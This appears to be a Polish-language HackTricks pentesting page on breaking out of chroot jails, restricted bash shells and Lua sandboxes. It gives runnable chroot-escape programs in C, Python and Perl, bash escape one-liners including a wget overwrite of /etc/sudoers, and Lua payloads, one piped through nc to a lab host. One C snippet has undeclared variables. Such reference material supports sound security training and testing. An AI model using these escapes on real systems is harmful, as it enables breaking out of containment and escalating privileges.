# Ucieczka z więzienia

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **GTFOBins**

**Szukaj w** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **czy możesz wykonać dowolny plik binarny z właściwością "Shell"**

## Ucieczki z Chroot

Z [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanizm chroot **nie jest przeznaczony do obrony** przed celowym manipulowaniem przez **uprzywilejowanych** (**root**) **użytkowników**. Na większości systemów konteksty chroot nie są odpowiednio stosowane i chrootowane programy **z wystarczającymi uprawnieniami mogą wykonać drugi chroot, aby się wydostać**.\
Zazwyczaj oznacza to, że aby uciec, musisz być rootem wewnątrz chroot.

{% hint style="success" %}
**Narzędzie** [**chw00t**](https://github.com/earthquake/chw00t) zostało stworzone do nadużywania poniższych scenariuszy i ucieczki z `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Jeśli jesteś **rootem** wewnątrz chroot, **możesz uciec**, tworząc **inny chroot**. Dzieje się tak, ponieważ 2 chrooty nie mogą istnieć obok siebie (w systemie Linux), więc jeśli utworzysz folder, a następnie **utworzysz nowy chroot** w tym nowym folderze będąc **na zewnątrz niego**, będziesz teraz **na zewnątrz nowego chroot** i w rezultacie będziesz w systemie plików.

Dzieje się tak, ponieważ zazwyczaj chroot NIE przenosi twojego bieżącego katalogu do wskazanego, więc możesz utworzyć chroot, ale być poza nim.
{% endhint %}

Zazwyczaj nie znajdziesz binarnego `chroot` wewnątrz więzienia chroot, ale **możesz skompilować, przesłać i wykonać** binarny: 

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
### Root + Zapisany fd

{% hint style="warning" %}
To jest podobne do poprzedniego przypadku, ale w tym przypadku **atakujący przechowuje deskryptor pliku do bieżącego katalogu**, a następnie **tworzy chroot w nowym folderze**. W końcu, ponieważ ma **dostęp** do tego **FD na zewnątrz** chroot, uzyskuje do niego dostęp i **ucieka**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD można przekazywać przez Unix Domain Sockets, więc:

* Utwórz proces potomny (fork)
* Utwórz UDS, aby rodzic i dziecko mogli się komunikować
* Uruchom chroot w procesie potomnym w innym folderze
* W procesie nadrzędnym utwórz FD folderu spoza nowego chroot procesu potomnego
* Przekaż do procesu potomnego ten FD, używając UDS
* Proces potomny zmienia bieżący katalog na ten FD, a ponieważ jest poza swoim chroot, ucieknie z więzienia
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Zamontuj urządzenie root (/) w katalogu wewnątrz chroot
* Chrootuj do tego katalogu

To jest możliwe w systemie Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Zamontuj procfs w katalogu wewnątrz chroot (jeśli jeszcze tego nie zrobiono)
* Znajdź pid, który ma inny wpis root/cwd, np.: /proc/1/root
* Chrootuj do tego wpisu
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Utwórz Fork (proces potomny) i chrootuj do innego folderu głębiej w systemie plików oraz zmień na niego katalog bieżący
* Z procesu nadrzędnego przenieś folder, w którym znajduje się proces potomny, do folderu poprzedniego niż chroot dzieci
* Proces potomny znajdzie się poza chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Kiedyś użytkownicy mogli debugować swoje własne procesy z procesu tego samego... ale to już domyślnie nie jest możliwe
* W każdym razie, jeśli to jest możliwe, można ptrace do procesu i wykonać shellcode wewnątrz niego ([zobacz ten przykład](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeracja

Uzyskaj informacje o więzieniu:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Zmodyfikuj ścieżkę (PATH)

Sprawdź, czy możesz zmodyfikować zmienną środowiskową PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korzystanie z vim
```bash
:set shell=/bin/sh
:shell
```
### Utwórz skrypt

Sprawdź, czy możesz utworzyć plik wykonywalny z zawartością _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Uzyskaj dostęp do basha przez SSH

Jeśli uzyskujesz dostęp za pomocą SSH, możesz skorzystać z tego triku, aby uruchomić powłokę bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Zadeklaruj
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Możesz nadpisać na przykład plik sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Inne sztuczki

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Może być również interesująca strona:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Więzienia Pythona

Sztuczki dotyczące ucieczki z więzień Pythona na następnej stronie:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Więzienia Lua

Na tej stronie znajdziesz globalne funkcje, do których masz dostęp wewnątrz Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval z wykonaniem polecenia:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Kilka sztuczek, aby **wywołać funkcje biblioteki bez użycia kropek**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Wylicz funkcje biblioteki:
```bash
for k,v in pairs(string) do print(k,v) end
```
Zauważ, że za każdym razem, gdy wykonasz poprzedni polecenie jednoliniowe w **innym środowisku Lua, kolejność funkcji się zmienia**. Dlatego jeśli musisz wykonać określoną funkcję, możesz przeprowadzić atak siłowy, wczytując różne środowiska Lua i wywołując pierwszą funkcję biblioteki le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Uzyskaj interaktywną powłokę lua**: Jeśli znajdujesz się w ograniczonej powłoce lua, możesz uzyskać nową powłokę lua (i miejmy nadzieję nieograniczoną) wykonując:
```bash
debug.debug()
```
## Odnośniki

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdy: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
